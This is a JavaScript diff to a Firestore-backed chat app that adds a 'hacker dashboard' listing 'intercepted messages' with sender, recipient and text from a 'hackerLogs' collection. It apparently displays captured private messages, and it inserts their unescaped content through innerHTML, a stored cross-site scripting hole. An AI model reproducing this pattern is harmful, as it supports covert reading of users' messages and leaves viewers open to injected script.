@@ -499,6 +499,8 @@ try {
   .getElementById("hacker-panel")
   .style.display = "block";
   
+  loadHackerDashboard();
+  
   alert("Hacker Dashboard Login");
   }
   
@@ -595,6 +597,76 @@ async function loadDMUsers() {
   }
 
   renderDMList();
+}
+
+
+function loadHackerDashboard() {
+
+  const box =
+    document.getElementById(
+      "intercepted-messages"
+    );
+
+  onSnapshot(
+    collection(db, "hackerLogs"),
+    (snap) => {
+
+      box.innerHTML = "";
+
+      snap.forEach(docSnap => {
+
+        const msg =
+          docSnap.data();
+
+        box.innerHTML += `
+        <div style="
+        background:#141414;
+        border:1px solid #2a2a2a;
+        border-left:4px solid #ff3b3b;
+        padding:12px;
+        border-radius:12px;
+        margin-bottom:12px;
+        ">
+        
+        <div style="
+        color:#ff3b3b;
+        font-size:12px;
+        font-weight:bold;
+        margin-bottom:6px;
+        ">
+        INTERCEPTED MESSAGE
+        </div>
+        
+        <div style="
+        font-size:12px;
+        color:#999;
+        margin-bottom:6px;
+        ">
+        ${msg.from}
+        </div>
+        
+        <div style="
+        font-size:12px;
+        color:#00ff88;
+        margin-bottom:10px;
+        ">
+        ↓
+        ${msg.to}
+        </div>
+        
+        <div style="
+        color:white;
+        word-break:break-word;
+        ">
+        ${msg.text}
+        </div>
+        
+        </div>
+        `;
+      });
+
+    }
+  );
 }
 
 // SEARCH USERS BY NAME OR EMAIL
